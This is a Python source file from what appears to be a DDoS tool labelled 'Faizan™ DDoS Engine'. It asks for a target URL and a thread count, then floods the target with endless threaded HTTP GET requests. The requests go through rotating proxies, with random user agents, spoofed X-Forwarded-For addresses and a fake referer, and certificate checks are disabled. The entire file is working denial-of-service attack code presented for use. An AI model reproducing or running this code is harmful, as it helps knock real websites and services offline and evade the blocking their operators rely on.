
import requests, random, threading
from utils.user_agents import get_random_agent
from attack_engines.proxy_rotator import get_proxy

def attack(url):
    while True:
        try:
            headers = {
                "User-Agent": get_random_agent(),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Referer": "https://google.com",
                "Connection": "keep-alive",
                "Faizan-Signature": "Faizan™ DDoS Engine"
            }
            proxy = get_proxy()
            requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, verify=False, timeout=5)
            print(f"[✓] Request sent via {proxy}")
        except:
            pass

def start_http_bypass():
    url = input("[?] Enter Target URL (with https://): ")
    threads = int(input("[?] Threads: "))
    print(f"[+] Launching attack on {url}")
    for _ in range(threads):
        threading.Thread(target=attack, args=(url,)).start()
